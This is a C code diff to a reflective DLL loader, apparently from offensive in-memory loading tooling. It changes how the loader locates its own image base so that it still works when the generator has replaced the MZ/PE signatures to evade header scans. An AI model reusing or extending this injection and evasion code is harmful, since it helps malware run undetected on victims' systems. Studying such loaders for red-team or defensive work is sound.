@@ -321,33 +321,35 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
     BW_DLLMAIN dllmain;
 
     /* this function runs FROM the wall (.text). Locate the image that owns
-     * us: scan backwards page-by-page for the MZ/PE that owns us - that is
-     * the container's decode buffer, NOT the host EXE (the EXE sits at a
-     * lower address and would only match if we walked past the flat copy).
+     * us: every real execution context (injectors, sRDI-style hosts, our
+     * append-template) copies the flat image into its own VirtualAlloc and
+     * calls into it, so the region's AllocationBase IS the image base -
+     * magic-agnostic and one syscall. Use it first.
      *
-     * magic_mz_x64/magic_pe support: the generator may replace the image's
-     * MZ/PE signatures with custom magic, so the header scan can miss. When
-     * it does, fall back to VirtualQuery on our own code pointer - the
-     * AllocationBase of the wall's region IS the image base regardless of
-     * what the header bytes say (fully magic-agnostic). */
+     * magic_mz_x64/magic_pe caveat, why the header scan is only a FALLBACK:
+     * a magic-patched image has no MZ/PE anywhere, so the old scan-first
+     * order walked 4096 pages DOWN - 16MB below a fresh VirtualAlloc is
+     * routinely unmapped, and the probe read faults before the fallback
+     * ever ran. The scan still covers exotic in-place contexts, but only
+     * after VirtualQuery has failed. */
     {
         QWORD pc = (QWORD)(DWORD_PTR)&ReflectiveLoader;
+        MEMORY_BASIC_INFORMATION mbi;
         flat = NULL;
-        for (j = 0; j < 4096; j++) {
-            unsigned char * page = (unsigned char *)(pc & ~0xFFFULL) - (unsigned long long)j * 0x1000;
-            if (*(WORD *)page == IMAGE_DOS_SIGNATURE) {
-                DWORD lf = *(DWORD *)(page + 0x3C);
-                if (lf < 0x1000 && *(DWORD *)(page + lf) == IMAGE_NT_SIGNATURE) {
-                    flat = page;
-                    break;
+        if (pVQ != NULL && pVQ((LPCVOID)(pc & ~0xFFFULL), &mbi, sizeof(mbi)) != 0
+            && mbi.AllocationBase != NULL)
+            flat = (unsigned char *)mbi.AllocationBase;
+        if (flat == NULL) {
+            for (j = 0; j < 4096; j++) {
+                unsigned char * page = (unsigned char *)(pc & ~0xFFFULL) - (unsigned long long)j * 0x1000;
+                if (*(WORD *)page == IMAGE_DOS_SIGNATURE) {
+                    DWORD lf = *(DWORD *)(page + 0x3C);
+                    if (lf < 0x1000 && *(DWORD *)(page + lf) == IMAGE_NT_SIGNATURE) {
+                        flat = page;
+                        break;
+                    }
                 }
             }
-        }
-        if (flat == NULL) {
-            MEMORY_BASIC_INFORMATION mbi;
-            if (pVQ != NULL && pVQ((LPCVOID)(pc & ~0xFFFULL), &mbi, sizeof(mbi)) != 0
-                && mbi.AllocationBase != NULL)
-                flat = (unsigned char *)mbi.AllocationBase;
         }
         if (flat == NULL)
             return 0;
